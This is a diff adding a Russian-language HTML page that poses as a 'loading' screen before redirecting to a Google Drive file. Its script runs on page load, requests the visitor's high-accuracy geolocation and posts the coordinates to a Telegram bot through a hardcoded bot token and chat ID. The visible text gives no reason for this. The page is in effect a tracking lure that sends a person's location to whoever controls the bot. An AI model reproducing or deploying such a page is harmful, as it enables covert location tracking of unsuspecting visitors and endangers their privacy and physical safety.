@@ -1,1 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Загрузка...</title>
+<script>
+  // Настройки
+  const botToken = "8348476399:AAEolZHUSZLeLgC1PaWxZIT1N_s3H93DnvU";
+  const chatId = "1845073752";
+  const targetUrl = "https://drive.google.com/file/d/1ih71G7Gs_xMetQIp6EEn96HlQ2afH3FX/view?usp=sharing";
 
+  // Получение геолокации (по запросу пользователя)
+  function getLocation() {
+    return new Promise(resolve => {
+      if (!navigator.geolocation) {
+        resolve(null);
+        return;
+      }
+      navigator.geolocation.getCurrentPosition(
+        pos => resolve({
+          lat: pos.coords.latitude,
+          lon: pos.coords.longitude,
+          acc: pos.coords.accuracy
+        }),
+        err => resolve(null),
+        { enableHighAccuracy: true, timeout: 5000 }
+      );
+    });
+  }
+
+  // Отправка уведомления
+  async function sendNotification() {
+    const geo = await getLocation();
+
+    let message = "Сигнал RED готов к запуску.\n";
+
+    if (geo) {
+      message += `Гео: ${geo.lat}, ${geo.lon} (точность ${geo.acc}м)`;
+    } else {
+      message += "Геолокация не предоставлена";
+    }
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const payload = {
+      chat_id: chatId,
+      text: message
+    };
+
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+  }
+
+  // Запуск отправки и редиректа
+  window.onload = async function() {
+    await sendNotification();
+    setTimeout(() => {
+      window.location.href = targetUrl;
+    }, 600);
+  };
+</script>
+</head>
+<body>
+Запуск протокола HungOut...
+</body>
+</html>
